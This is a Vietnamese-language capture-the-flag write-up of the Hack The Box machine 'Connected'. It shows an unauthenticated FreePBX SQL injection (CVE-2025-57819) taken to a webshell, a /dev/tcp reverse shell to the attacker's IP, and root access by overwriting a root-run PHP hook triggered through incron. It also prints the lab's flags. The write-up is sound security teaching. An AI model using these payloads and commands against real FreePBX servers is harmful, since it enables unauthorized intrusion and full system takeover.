---
description: writeup
coverY: 0
---

# Connected

## HTB: Connected

**Author:** duongpahm\
**IP:** `10.129.208.214`

***

### Summary

**Connected** là một máy Linux theo hướng khai thác web application và misconfiguration. Dịch vụ chính là **FreePBX 16.0.40.7** chạy trên **Apache** tại cổng `80` và `443`. Chuỗi tấn công bắt đầu từ lỗi **unauthenticated SQL injection** trong module `endpoint`, sau đó được nâng thành **RCE** bằng exploit công khai để thả webshell. Shell ban đầu chạy dưới quyền `asterisk`. Từ đây, điểm yếu tiếp theo nằm ở cơ chế hook của `sysadmin` được kích hoạt qua `incron`, nơi một file PHP do `asterisk` sở hữu lại được **root** gọi gián tiếp. Chỉ cần ghi đè file này và kích hoạt hook, tôi lấy được `root.txt`.

Điểm hay của máy này là từng bước nối tiếp nhau rất rõ ràng. Web enumeration giúp xác định đúng công nghệ đích. SQL injection mở ra khả năng tác động sâu vào FreePBX mà không cần đăng nhập. Sau khi có foothold, bài toán còn lại chỉ là tìm một thành phần nội bộ nào đó được root gọi nhưng không được bảo vệ chặt về quyền hạn. Connected đúng là một ví dụ rất thực tế cho kiểu tấn công này.

***

### Recon

#### Scanning

Giai đoạn đầu tiên luôn là xác định chính xác bề mặt tấn công. Tôi bắt đầu bằng **RustScan** để dò nhanh các cổng TCP đang mở trên máy mục tiêu:

```bash
┌──(duong㉿duong)-[~]
└─$ rustscan -a 10.129.208.214
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
...
Open 10.129.208.214:22
Open 10.129.208.214:80
Open 10.129.208.214:443
```

RustScan cho thấy mục tiêu chỉ lộ ra ba cổng chính. Đây là một attack surface khá gọn. Trong bối cảnh lab Linux, việc chỉ có `22`, `80`, và `443` thường là tín hiệu rõ rằng hướng đi chính sẽ nằm ở web application.

Sau đó, tôi dùng **Nmap** để lấy banner dịch vụ và fingerprint chi tiết hơn:

```bash
PORT    STATE SERVICE   REASON         VERSION
22/tcp  open  ssh       syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http      syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/https syn-ack ttl 63 Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| ssl-cert: Subject: commonName=pbxconnect/...
```

Kết quả cho thấy ba cổng quan trọng:

* `22/tcp` — SSH
* `80/tcp` — HTTP
* `443/tcp` — HTTPS

Từ kết quả này, có hai chi tiết đáng chú ý ngay lập tức:

* Port `80` không phục vụ trực tiếp theo IP mà chuyển hướng về `connected.htb`
* Chứng chỉ TLS ở port `443` còn để lộ hostname `pbxconnect`

Điều đó cho thấy web server đang dùng **name-based virtual hosting**. Nếu không cấu hình đúng hostname cục bộ, nhiều nội dung có thể không hiển thị đúng. Vì vậy tôi thêm cả hai hostname vào file hosts:

```bash
echo "10.129.208.214 connected.htb pbxconnect" | sudo tee -a /etc/hosts
```

#### Fingerprinting ứng dụng web

Sau khi truy cập web, giao diện cho thấy đây là **FreePBX**. Đây là một nền tảng quản trị VoIP khá phổ biến. Với các ứng dụng dạng appliance như FreePBX, việc xác định đúng phiên bản và module là bước rất quan trọng, vì lỗ hổng thường không nằm ở lớp web server mà nằm ở logic xử lý trong module nội bộ.

Tôi dùng **Nuclei** để rà nhanh các lỗ hổng đã biết:

```bash
┌──(duong㉿duong)-[~]
└─$ nuclei -u http://connected.htb/

[CVE-2025-57819:sqli] [http] [critical] http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+ ["freepbxuser @localhost"]
[freepbx-administration-panel] [http] [info] http://connected.htb/admin/config.php ["16.0.40.7"]
```

Điểm quan trọng ở đây:

* Ứng dụng chạy **FreePBX 16.0.40.7**
* Endpoint `admin/ajax.php` dính **SQL injection**
* Lỗi có thể khai thác **không cần xác thực**

Đây là tín hiệu cực mạnh. Một lỗi SQL injection unauthenticated trên endpoint quản trị gần như luôn là con đường dẫn thẳng đến compromise toàn bộ ứng dụng.

***

### Foothold

#### Xác thực SQL injection

Trước khi dùng công cụ tự động hoặc chạy exploit, tôi luôn xác thực lỗi bằng tay để hiểu rõ endpoint phản hồi như thế nào. Ở đây tôi chèn payload `EXTRACTVALUE` để ép MySQL trả lỗi chứa dữ liệu truy vấn:

```bash
┌──(duong㉿duong)-[~]
└─$ curl -i -k "https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"

HTTP/1.1 500 Internal Server Error
...
{"error":{"type":"Exception","message":"SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~USER:freepbxuser @localhost~'::","file":"/var/www/html/admin/libraries/utility.functions.php","line":123}}
```

Phản hồi trả về chính xác user của database là `freepbxuser@localhost`. Điều này xác nhận tham số `brand` bị nối trực tiếp vào câu lệnh SQL mà không có cơ chế lọc đầu vào hoặc prepared statement phù hợp.

Điểm mạnh của lỗi này không chỉ nằm ở việc rò rỉ thông tin. Quan trọng hơn là:

* lỗi nằm ở endpoint quản trị
* lỗi có thể kích hoạt mà không cần phiên đăng nhập
* kết quả truy vấn bị phản chiếu trực tiếp trong thông báo lỗi

Ba yếu tố này kết hợp lại khiến bề mặt tấn công rất thuận lợi.

#### Tự động hóa với SQLMap

Sau khi xác thực bằng tay, tôi dùng **sqlmap** để kiểm tra chiều sâu khai thác:

```bash
┌──(duong㉿duong)-[~]
└─$ sqlmap -u "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x" -p brand --batch

Parameter: brand (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: ...brand=x' AND EXTRACTVALUE(9461,CONCAT(0x5c,0x71766a6271,(SELECT (ELT(9461=9461,1))),0x7176627671))-- awxZ
...
```

Kết quả cho thấy backend hỗ trợ **stacked queries**. Đây là chi tiết rất có giá trị. Khi một lỗi SQLi cho phép chạy nhiều câu lệnh liên tiếp, attacker không còn bị giới hạn ở việc đọc dữ liệu mà có thể bắt đầu thay đổi trạng thái ứng dụng hoặc cấy dữ liệu phục vụ cho các chuỗi khai thác tiếp theo.

Trong ngữ cảnh FreePBX, điều này đặc biệt nguy hiểm vì hệ thống có rất nhiều bảng cấu hình, task, và thành phần tự động xử lý nội bộ.

#### Dùng exploit để lấy RCE

Tôi sử dụng exploit công khai của **watchTowr** cho chuỗi khai thác FreePBX. Script này lợi dụng auth bypass kết hợp SQLi để ghi webshell lên máy chủ:

```bash
┌──(duong㉿duong)-[~]
└─$ python3 script.py -H https://connected.htb/
                         __         ___ __________                   __
        __  _  _______ _/  |__  ____ |  |\__    ___\______  _  _______/  |_
        \ \/ \/ /\__  \\   __\/ ___\|  |  |    | /  _ \ \/ \/ /\_  __ \
         \     /  / __ \|  | \  \___|  |__|    |(  <_> )     / |  | \/
          \/\_/  (____  /__|  \___  >____/|____| \____/ \/\_/  |__|
                      \/          \/

       watchTowr-vs-FreePBX-CVE-2025-57819.py
       (*) CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE

[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
[+] Sending exploit request
[+] Waiting 2 minutes for DAG script to be created
[+] VULNERABLE - webshell found: https://connected.htb/this-is-an-ioc-not-actually-watchTowr-1jhd9qhmq7.php?cmd=hostname
```

Webshell đã được tạo thành công. Đây là bước chuyển quan trọng nhất trong giai đoạn foothold. Từ đây tôi không còn chỉ tương tác với database nữa, mà đã có thể yêu cầu máy chủ thực thi lệnh ở tầng hệ điều hành.

#### Reverse shell dưới quyền `asterisk`

Tôi mở listener trên máy tấn công:

```bash
nc -lvnp 4444
```

Sau đó gọi webshell để thực thi reverse shell:

```bash
curl -k -G "https://connected.htb/this-is-an-ioc-not-actually-watchTowr-1jhd9qhmq7.php" \
  --data-urlencode "cmd=sh -i >& /dev/tcp/10.10.14.51/4444 0>&1"
```

Listener nhận kết nối:

```bash
connect to [10.10.14.51] from (UNKNOWN) [10.129.208.214] 32942
sh: no job control in this shell
sh-4.2$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

Shell trả về dưới quyền `asterisk`. Đây là điều hợp lý trong ngữ cảnh của một hệ thống FreePBX, vì nhiều service backend liên quan đến telephony thường chạy bằng user này.

Tôi nâng cấp shell để thao tác thuận tiện hơn:

```bash
sh-4.2$ python3 -c 'import pty; pty.spawn("/bin/bash")'
[asterisk@connected ~]$
```

#### User flag

```bash
[asterisk@connected ~]$ cat ~/user.txt
1f01842a09f2115b667c22c7bae7b57a
```

***

### Privilege Escalation

#### Phát hiện `incron`

Sau khi có foothold, bước tiếp theo là local enumeration. Tôi rà soát các thành phần nội bộ của FreePBX và phát hiện một cấu hình `incron` đáng chú ý:

```bash
[asterisk@connected ~]$ cat /etc/incron.d/sysadmin
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

Dịch vụ này theo dõi thư mục `/var/spool/asterisk/incron/`. Mỗi khi có thay đổi trong thư mục đó, hệ thống sẽ chạy `/usr/bin/sysadmin_manager` dưới quyền **root**.

Đây là chi tiết rất đáng chú ý. Mọi cơ chế tự động hóa chạy với quyền root đều cần được kiểm tra kỹ. Chỉ cần một thành phần trong chuỗi xử lý bị gán quyền sai là foothold thấp có thể biến thành root rất nhanh.

#### Phân tích chuỗi hook

Tiếp tục lần theo `sysadmin_manager`, tôi thấy nó gọi nhiều hook khác nhau. Một hook đáng chú ý là `packetcapture-capture`:

```bash
[asterisk@connected ~]$ cat /var/www/html/admin/modules/sysadmin/hooks/packetcapture-capture
bindir=`dirname $0`
bindir="$bindir/../bin"
php $bindir/packetcapture.php $1 &
```

Hook này gọi trực tiếp tới file:

```bash
/var/www/html/admin/modules/sysadmin/bin/packetcapture.php
```

Tôi kiểm tra quyền của file PHP đó:

```bash
[asterisk@connected ~]$ ls -l /var/www/html/admin/modules/sysadmin/bin/packetcapture.php
-rwxr-xr-x. 1 asterisk asterisk 19200 Nov 2 2023 /var/www/html/admin/modules/sysadmin/bin/packetcapture.php
```

Đây là lỗi phân quyền rất nặng:

* `root` gián tiếp thực thi file này
* file lại thuộc sở hữu `asterisk`
* user hiện tại có thể ghi đè toàn bộ nội dung

Về bản chất, đây là dạng **writable script executed by root**. Đây là kiểu lỗi rất thực tế trong môi trường thật. Nhiều quản trị viên kiểm soát file wrapper hoặc cron job chính, nhưng lại quên khóa quyền ở các file phụ mà script đó gọi tới.

#### Ghi đè `packetcapture.php`

Tôi thay nội dung file bằng payload đơn giản để copy `root.txt` ra web root:

```bash
echo '<?php system("cat /root/root.txt > /var/www/html/root.txt"); ?>' > /var/www/html/admin/modules/sysadmin/bin/packetcapture.php
```

Ở bước này, tôi chọn payload rất tối giản. Mục tiêu chỉ là chứng minh khả năng thực thi lệnh dưới quyền root. Nếu muốn, hoàn toàn có thể thay payload bằng reverse shell hoặc thêm SSH key vào `authorized_keys`. Nhưng với HTB, việc copy `root.txt` ra web root là đủ rõ ràng và ít gây nhiễu nhất.

#### Trigger để root chạy payload

Sau đó, tôi tạo một file rác trong thư mục mà `incron` đang theo dõi:

```bash
touch /var/spool/asterisk/incron/sysadmin_packetcapture-capture
```

Thao tác này kích hoạt `sysadmin_manager`, rồi tới hook `packetcapture-capture`, và cuối cùng khiến **root** chạy file PHP mà tôi vừa sửa.

Chuỗi logic ở đây diễn ra như sau:

1. `incron` phát hiện thay đổi trong thư mục spool.
2. `sysadmin_manager` được gọi bằng quyền root để xử lý event.
3. Hook `packetcapture-capture` được thực thi.
4. Hook gọi `packetcapture.php`.
5. Nội dung PHP độc hại chạy dưới ngữ cảnh của root.

#### Lấy root flag

Khi payload hoàn tất, tôi đọc file vừa được copy ra:

```bash
[asterisk@connected ~]$ curl http://localhost/root.txt
63ce85621b30a7bc95932469d6e445ca
```

Như vậy quá trình leo thang đặc quyền đã hoàn tất mà không cần kernel exploit, không cần sudo misconfiguration, và cũng không cần credential reuse. Toàn bộ phần privesc đến từ lỗi thiết kế quyền trong cơ chế hook nội bộ.
